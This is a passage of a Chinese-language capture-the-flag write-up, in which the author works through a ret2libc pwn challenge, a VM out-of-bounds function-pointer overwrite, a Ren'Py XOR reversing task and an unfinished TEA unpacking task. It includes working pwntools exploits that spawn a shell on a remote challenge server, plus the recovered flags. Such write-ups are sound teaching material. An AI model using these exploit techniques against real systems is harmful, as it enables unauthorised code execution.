+</span></span><span class="line"><span class="cl"><span class="c1">#输出为：</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#Hello! Hacker, please keep this secret key safe and make sure it is not stolen by others.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#key:flag{f871360f-c353-42da-a782-d5b8a252d1e4}</span>
+</span></span></code></pre></div><h4 id="flag-1">
+<a class="header-anchor" href="#flag-1"></a>
+Flag
+</h4><p><code>flag{f871360f-c353-42da-a782-d5b8a252d1e4}</code></p>
+<h2 id="pwn">
+<a class="header-anchor" href="#pwn"></a>
+Pwn
+</h2><h3 id="blindrop">
+<a class="header-anchor" href="#blindrop"></a>
+blindrop
+</h3><h4 id="思路-2">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af-2"></a>
+思路
+</h4><p>先checksec一下</p>
+<p><code>checksec</code> 检查结果表明：目标为 32 位 i386 ELF，未开启 Canary、NX、PIE、RELRO 等常见保护，栈具有可执行权限，且存在 RWX 段。</p>
+<p>保护全部没开。放进IDA审一下</p>
+<p>IDA 反编译后可见，程序使用 <code>read(0, f.buf, 0x200)</code> 向较小的栈缓冲区读取数据，形成明显的栈溢出。读取结束后程序还会比较 <code>f.canary</code> 与参数 <code>expected</code>，只有两者相等才会继续执行并返回。</p>
+<p>read函数存在栈溢出，并且利用时需要同时覆盖f.canary和栈上的expected参数，使二者相等，从而绕过检查。经过搜索，没发现system和binsh，考虑是ret2libc题目。这道题目又puts，我们直接泄露puts地址，通过ret2libc调用 system(&quot;/bin/sh&quot;)去getshell。</p>
+<p>根据调试器中的栈布局，缓冲区起始位置到 <code>f.canary</code> 的偏移为 <code>0x80</code>，到保存返回地址的偏移为 <code>0x90</code>。<code>expected</code> 对应返回地址后的第一个 4 字节参数，因此可将 <code>f.canary</code> 和 <code>ret_after</code> 写成同一个值来绕过检查。payload 的核心布局如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">padding(0x80)
+</span></span><span class="line"><span class="cl">f.canary = ret_after
+</span></span><span class="line"><span class="cl">padding(0x0c)
+</span></span><span class="line"><span class="cl">ret_addr
+</span></span><span class="line"><span class="cl">ret_after / expected
+</span></span><span class="line"><span class="cl">arg
+</span></span></code></pre></div><p>如果按照普通栈溢出方式构造 payload，<code>f.canary</code> 与 <code>expected</code> 会不相等，程序将终止。由于 <code>expected</code> 正好位于返回地址后的 4 字节，也就是 32 位调用约定中的 <code>ret_after</code> 位置，所以将 <code>f.canary</code> 同样设置为 <code>ret_after</code> 即可通过检查。随后利用该布局泄露 <code>puts</code> 地址。</p>
+<p>第一阶段 ROP 调用 <code>puts(puts@got)</code> 泄露 libc 地址，然后返回 <code>main</code> 再次输入。调试输出中得到：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">puts_addr = 0xf7d61810
+</span></span></code></pre></div><p>put泄露出来时0xf7d61810，进行libc搜索</p>
+<p>将泄露的 <code>puts</code> 地址低位提交到 libc 数据库进行匹配，共得到 4 个候选。结合题目给出的 Ubuntu 22.04 环境，最终确认使用 <code>libc6-i386_2.35-0ubuntu3.14_amd64</code>。</p>
+<p>搜索到4个，题目提示我们时ubuntu22.04，所以考虑后两个，在尝试过后发现是libc6-i386_2.35-0ubuntu3.14_amd64。此题基本解完</p>
+<h4 id="exp">
+<a class="header-anchor" href="#exp"></a>
+exp
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&#34;linux&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./blindrop&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenge.xiaoyuyc.com&#34;</span><span class="p">,</span> <span class="mi">31970</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./blindrop&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;main&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">canary_offset</span> <span class="o">=</span> <span class="mh">0x80</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x90</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">payload32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">,</span> <span class="n">ret_after</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="n">canary_offset</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_after</span><span class="p">)</span>                         
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="n">canary_offset</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>                          
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_after</span><span class="p">)</span>                         
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>                               
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">payload32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;payload&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;canary check passed.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;puts_addr = &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc_base   = &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;system_addr = &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;binsh_addr  = &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">payload32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;payload&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>第二阶段根据 libc 基址计算 <code>system</code> 与 <code>&quot;/bin/sh&quot;</code> 的地址，发送 <code>system(&quot;/bin/sh&quot;)</code> 的 ROP 链后成功获得 shell，并读取到 flag。</p>
+<h4 id="flag-2">
+<a class="header-anchor" href="#flag-2"></a>
+flag
+</h4><p><code>flag{fbfa626d-1741-40cc-97c2-77ee9089b0ec}</code></p>
+<h3 id="vmpwn">
+<a class="header-anchor" href="#vmpwn"></a>
+vmpwn
+</h3><h4 id="思路-3">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af-3"></a>
+思路
+</h4><p>先checksec一下，保护只开了SHSTK和IBT，没有开启 PIE</p>
+<p><code>checksec</code> 显示该程序为 amd64 ELF，仅启用了 CET 相关的 SHSTK、IBT；未开启 PIE，因此程序代码地址固定，可以直接使用 <code>win</code> 函数的静态地址。</p>
+<p>在IDA中，看到一个win的函数，里面有flag输出，由于并没有开启PIE，所以可以直接拿到win地址，win=0x4012c7,所以我们思路就是让他执行win即可。</p>
+<p>IDA 中存在后门函数 <code>win()</code>，地址为 <code>0x4012c7</code>。该函数会打开 <code>flag</code> 文件，读取其中内容并通过 <code>puts</code> 输出，因此利用目标是劫持 VM 的函数调用到 <code>win()</code>。</p>
+<p>程序先初始化了一个数组，这里循环变量i从0到7，每次写入：[rbp+rax*8+vm.mem]，因此一共有 8 个元素，每个元素 8 字节。接着程序初始化了两个函数指针。VM在栈上的布局可以简单理解为vm.mem[0~7],vm.funcs[0-1]，两者应该是紧挨。</p>
+<p>初始化逻辑先将 <code>vm.mem[0..7]</code> 共 8 个 64 位元素清零，随后设置两个函数指针。可将栈上结构近似表示为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">vm.mem[0]
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">vm.mem[7]
+</span></span><span class="line"><span class="cl">vm.funcs[0]
+</span></span><span class="line"><span class="cl">vm.funcs[1]
+</span></span></code></pre></div><p>因此越界访问 <code>vm.mem[8]</code> 时，实际访问的就是 <code>vm.funcs[0]</code>。</p>
+<p>VM 的 <code>push</code> 指令（<code>op = 1</code>）从字节码中读取一个 64 位立即数压入虚拟栈；<code>pop</code> 指令（<code>op = 2</code>）读取一个 1 字节索引，并把栈顶值写入 <code>vm.mem[idx]</code>。其中 <code>pop</code> 没有验证 <code>idx &lt; 8</code>，构成数组越界写。</p>
+<p>同时在switch中的op=2中并没有检查idx的范围，如果idx=8，那么我们访问的是vm.mem[8]，也就是vm.funcs[0]。op=4是用来调用函数的。这里虽然会检查idx只能是0或1，但是我们可以先把vm.funcs[0]覆盖成win()的地址。</p>
+<p>VM 的 <code>call</code> 指令（<code>op = 4</code>）虽然会检查函数索引只能为 0 或 1，但它最终直接执行 <code>vm.funcs[idx]()</code>。因此先利用 <code>pop 8</code> 把 <code>vm.funcs[0]</code> 改为 <code>win</code>，再执行 <code>call 0</code> 即可。</p>
+<p>所以exp主要思路是：push win地址 -&gt; pop到vm.mem[8]，覆盖 vm.funcs[0] -&gt; call 0，调用 vm.funcs[0] -&gt; 成功进入 win()</p>
+<h4 id="exp-1">
+<a class="header-anchor" href="#exp-1"></a>
+exp
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vmpwn&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">win</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">win</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x02\x08</span><span class="s1">&#39;</span>        
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x04\x00</span><span class="s1">&#39;</span>        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process([&#39;./ld-linux-x86-64.so.2&#39;, &#39;./vmpwn&#39;], env={&#39;LD_PRELOAD&#39;: &#39;./libc.so.6&#39;})</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenge.xiaoyuyc.com&#34;</span><span class="p">,</span><span class="mi">43310</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;len&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;code&gt; &#39;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>发送字节码 <code>push win; pop 8; call 0</code> 后，程序成功跳转到 <code>win()</code> 并输出 flag。</p>
+<h4 id="flag-3">
+<a class="header-anchor" href="#flag-3"></a>
+flag
+</h4><p><code>flag{f638e8b0-f7a3-4ed7-8162-e39911f97f01}</code></p>
+<h2 id="reverse">
+<a class="header-anchor" href="#reverse"></a>
+Reverse
+</h2><h3 id="galgame">
+<a class="header-anchor" href="#galgame"></a>
+galgame
+</h3><h4 id="思路-4">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af-4"></a>
+思路
+</h4><p>打开文件，看到renp、game/script.rpyc、script_version.txt后，判断这是一个RenPy打包游戏。</p>
+<p>解包后的目录具有典型 Ren&rsquo;Py 游戏结构，根目录包含 Ren&rsquo;Py 运行组件，<code>game</code> 目录中包含 <code>script.rpyc</code>，同时存在 <code>script_version.txt</code>。由于未提供 <code>.rpy</code> 源码，可确定需要反编译 <code>.rpyc</code>。</p>
+<p>script_version.txt中我们可以看到游戏使用的是renpy8.5.2</p>
+<p><code>script_version.txt</code> 中记录的版本信息表明，该游戏脚本由 Ren&rsquo;Py <code>8.5.2</code> 编译。</p>
+<p>在game文件夹里没有发现.rpy源码，因此我们将script.rpyc使用unrpyc弄出script.rpy</p>
+<p>使用 <code>unrpyc</code> 反编译 <code>game/script.rpyc</code> 得到 <code>script.rpy</code>。关键逻辑与数据如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">init</span> <span class="n">python</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">heart</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;OJN</span><span class="se">\x1b\x1a\x1c\x1a</span><span class="s1">HULLI</span><span class="se">\x1d</span><span class="s1">UL</span><span class="se">\x1c\x1d</span><span class="s1">KU</span><span class="se">\x1a\x19</span><span class="s1">KOULO</span><span class="se">\x1c</span><span class="s1">HKJ</span><span class="se">\x1e\x1d</span><span class="s1">O</span><span class="se">\x1a</span><span class="s1">@</span><span class="se">\x19</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x78</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">label</span> <span class="n">start</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span> <span class="n">user_input</span> <span class="o">=</span> <span class="n">renpy</span><span class="o">.</span><span class="n">input</span><span class="p">(</span><span class="s2">&#34;just input your answer: &#34;</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span> <span class="n">user_input</span> <span class="o">=</span> <span class="n">user_input</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="err">$</span> <span class="n">encry_input</span> <span class="o">=</span> <span class="n">dec</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">encry_input</span> <span class="o">==</span> <span class="n">heart</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="s2">&#34;you are right&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="s2">&#34;Please include WuCup before submitting&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="s2">&#34;no no no&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">jump</span> <span class="n">start</span>
+</span></span></code></pre></div><p>也就是说，正确输入的每个字符与 <code>0x78</code> 异或后，应当等于 <code>heart</code> 中对应的字节。</p>
+<p>我们可以看出其输出逻辑是：用户输入 → 每个字符 XOR 0x78 → encode 成 bytes → 和 heart 比较</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ user_input = renpy.input(&#34;just input your answer: &#34;, length=60)
+</span></span><span class="line"><span class="cl">$ user_input = user_input.strip()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ encry_input = dec(user_input)
+</span></span><span class="line"><span class="cl">if encry_input == heart:
+</span></span><span class="line"><span class="cl">    e &#34;you are right&#34;
+</span></span><span class="line"><span class="cl">    e &#34;Please include WuCup before submitting&#34;
+</span></span><span class="line"><span class="cl">else:
+</span></span><span class="line"><span class="cl">    e &#34;no no no&#34;
+</span></span><span class="line"><span class="cl">    jump start
+</span></span></code></pre></div><p>所以我们直接XOR一下就能获取flag</p>
+<h4 id="脚本">
+<a class="header-anchor" href="#%e8%84%9a%e6%9c%ac"></a>
+脚本
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">heart = b&#39;OJN\x1b\x1a\x1c\x1aHULLI\x1dUL\x1c\x1dKU\x1a\x19KOULO\x1cHKJ\x1e\x1dO\x1a@\x19&#39;
+</span></span><span class="line"><span class="cl">ans = &#39;&#39;.join(chr(b ^ 0x78) for b in heart)
+</span></span><span class="line"><span class="cl">print(ans)
+</span></span></code></pre></div><p>脚本运行后输出：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">726cbdb0-441e-4de3-ba37-47d032fe7b8a
+</span></span></code></pre></div><p>结合游戏中的提示“提交时包含 WuCup”，平台提交格式最终按本题要求写为对应的 flag。</p>
+<h4 id="flag-4">
+<a class="header-anchor" href="#flag-4"></a>
+flag
+</h4><p><code>flag{726cbdb0-441e-4de3-ba37-47d032fe7b8a}</code></p>
+<h3 id="tea">
+<a class="header-anchor" href="#tea"></a>
+Tea
+</h3><h4 id="思路-5">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af-5"></a>
+思路
+</h4><p>拿到附件后，先对程序做基础静态分析。</p>
+<p>基础静态分析结果：附件是一个 64 位 Windows PE 可执行文件，映像基址为 <code>0x140000000</code>，入口 RVA 为 <code>0x14270</code>，即入口 VA 为 <code>0x140014270</code>。IDA 初次载入后只能识别出很少的有效函数，入口附近主要是解包 stub，说明程序被加壳。</p>
+<p>程序是一个64位PE文件，进口是0x14270，在IDA打开后函数少的可怜，明显有壳。且出现upx，再通过die发现是upx3.91+wcp的壳</p>
+<p>Detect It Easy（DIE）检测结果显示：程序外层具有 <code>UPX 3.91</code> 特征，同时还存在 WCP 壳特征，因此需要先处理 UPX，再动态脱掉内层 WCP 壳。</p>
+<p>去除外层 UPX 并重新载入 IDA 后，PE 节区结构中可看到用于壳代码/数据的 WCP 相关节区；入口仍位于 <code>RVA 0x14270</code> 附近。此时真实代码尚未静态恢复，需要运行至 WCP stub 解包结束后再 dump 内存映像。</p>
+<p>动态脱内层WCP壳,内层WCP壳的入口仍在当前PE的入口点附近：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">EntryVA = 0x140014270
+</span></span></code></pre></div><p>这部分代码负责把真实程序还原到内存，然后跳转到真实代码。静态分析 WCP 节意义不大，需要动态运行到解包完成之后再 dump。</p>
+<p>调试时关注WCP stub末尾的跳转。最终定位到解包完成附近的跳转点：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">RVA: 0x144cb
+</span></span><span class="line"><span class="cl">VA : ImageBase + 0x144cb
+</span></span></code></pre></div><p>本次运行时ASLR后模块基址为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">ImageBase = 0x7ff7564b0000
+</span></span><span class="line"><span class="cl">Breakpoint = 0x7ff7564c44cb
+</span></span></code></pre></div><p>断在 <code>RVA 0x144cb</code> 后，此时内存中的真实代码已经被还原。读取进程中从模块基址开始、大小为SizeOfImage = 0x16000的内存，保存为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">tea_runtime_unpacked.mem
+</span></span></code></pre></div><p>为了确认dump成功，在dump中搜索字符串和TEA常量：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">dump size 0x16000
+</span></span><span class="line"><span class="cl">b&#39;Please&#39; 0x4090
+</span></span><span class="line"><span class="cl">b&#39;Correct&#39; 0x40ab
+</span></span><span class="line"><span class="cl">b&#39;Wrong&#39;   0x40bf
+</span></span><span class="line"><span class="cl">b&#39;flag{&#39;   0x4000
+</span></span><span class="line"><span class="cl">TEA delta  0x1466
+</span></span><span class="line"><span class="cl">strcmp     0x1329d, 0x152da
+</span></span></code></pre></div><p>可以看到真实程序字符串已经出现：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">flag{
+</span></span><span class="line"><span class="cl">Please enter the flag:
+</span></span><span class="line"><span class="cl">Correct! well done.
+</span></span><span class="line"><span class="cl">Wrong flag.
+</span></span><span class="line"><span class="cl">strcmp
+</span></span></code></pre></div><p>说明内层壳已经脱完，可以继续分析真实逻辑。在运行时dump中，真实代码的基址按原始ImageBase = 0x140000000计算。关键函数如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">TEA 解密函数：0x140001440
+</span></span><span class="line"><span class="cl">key 派生函数：0x140001513
+</span></span><span class="line"><span class="cl">主校验函数：0x1400015b6
+</span></span></code></pre></div><p>主函数中先打印提示并读取用户输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00000001400015</span><span class="nf">cb</span> <span class="no">lea</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2abe</span><span class="p">]</span>    <span class="c1">; &#34;Please enter the flag: &#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">00000001400015</span><span class="nf">d5</span> <span class="no">call</span>    <span class="mi">0x1400029e0</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">00000001400015</span><span class="nf">fa</span> <span class="no">call</span>    <span class="mi">0x140002b90</span>            <span class="c1">; fgets/input
+</span></span></span></code></pre></div><p>之后调用 key 派生函数：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000140001633</span> <span class="nf">lea</span>     <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x50</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000140001637</span> <span class="nf">mov</span>     <span class="no">rcx</span><span class="p">,</span> <span class="no">rax</span>
+</span></span><span class="line"><span class="cl"><span class="err">000000014000163</span><span class="nf">a</span> <span class="no">call</span>    <span class="mi">0x140001513</span>
+</span></span></code></pre></div><p>接着循环读取 10 个 dword 密文，每两个 dword 作为一个 TEA block 调用解密函数：</p>
